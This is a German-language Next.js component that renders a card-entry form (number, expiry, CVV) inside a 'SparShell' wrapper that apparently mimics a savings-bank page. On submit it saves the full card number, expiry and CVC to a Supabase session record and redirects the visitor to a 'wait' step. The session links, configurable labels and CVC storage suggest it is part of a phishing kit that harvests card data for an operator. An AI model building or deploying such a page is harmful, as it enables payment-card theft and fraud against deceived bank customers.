"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { SparShell } from "@/components/demo/SparShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function CardClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-1 w-full px-3 py-2",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-60",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setNumber(fd.cardNumber ?? "");
      setExpiry(fd.cardExpiry ?? "");
      setCvc(fd.cardCvc ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Bitte geben Sie ein gueltiges Ablaufdatum im Format MM/JJ ein.");
      return;
    }
    if (!cvcValid) {
      setMsg("Bitte geben Sie einen gueltigen CVV mit 3 oder 4 Ziffern ein.");
      return;
    }
    setSaving(true);
    setMsg(null);

    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    const { error } = await supabase
      .from("sessions")
      .update({
        current_step: "wait",
        form_data: {
          ...prev,
          cardHolder: "",
          cardNumber: number.trim(),
          cardExpiry: expiry.trim(),
          cardCvc: cvc.trim(),
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Speichern fehlgeschlagen.");
    else router.replace(stepToPath("wait", sessionId));
  }

  if (!supabase) {
    return (
      <SparShell title="Kartendaten">
        <ConfigMissing />
      </SparShell>
    );
  }

  if (!sessionId) {
    return (
      <SparShell title="Kartendaten">
        <p className="rounded-xl border border-amber-200 bg-amber-50 p-4 text-center text-sm">
          Ungueltiger Link.
        </p>
      </SparShell>
    );
  }

  return (
    <SparShell>
      <div className="space-y-4 w-full mt-24 sm:mt-6">
        <div className={ui.panel}>
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold text-gray-900">{settings.card_title}</h2>
            <p className="text-sm text-gray-600 mt-1 font-medium">{settings.card_subtitle}</p>
          </div>
          <form onSubmit={handleSubmit} className="space-y-4">
          <label className="block text-sm font-bold text-zinc-800">
            {settings.card_number_label}
            <input
              required
              inputMode="numeric"
              className={`${ui.input} tracking-widest`}
              value={number}
              onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
              autoComplete="cc-number"
            />
          </label>
          <div className="grid grid-cols-2 gap-3">
            <label className="block text-sm font-bold text-zinc-800">
              {settings.card_expiry_label}
              <input
                required
                placeholder="MM/JJ"
                className={ui.input}
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                autoComplete="cc-exp"
                inputMode="numeric"
                maxLength={5}
              />
            </label>
            <label className="block text-sm font-bold text-zinc-800">
              {settings.card_cvv_label}
              <input
                required
                inputMode="numeric"
                maxLength={4}
                className={ui.input}
                value={cvc}
                onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                autoComplete="cc-csc"
              />
            </label>
          </div>

          {!expiryValid && expiry.length > 0 ? (
            <p className="text-xs text-red-600">Ablaufdatum muss im Format MM/JJ sein.</p>
          ) : null}

          {!cvcValid && cvc.length > 0 ? (
            <p className="text-xs text-red-600">CVV muss aus 3 oder 4 Ziffern bestehen.</p>
          ) : null}

          {msg ? <p className="text-center text-sm text-[#003b8f]">{msg}</p> : null}

          <button
            type="submit"
            disabled={saving || !expiryValid || !cvcValid}
            className={ui.submit}
          >
            {saving ? "Senden…" : settings.card_button}
          </button>
        </form>
        </div>
      </div>
    </SparShell>
  );
}
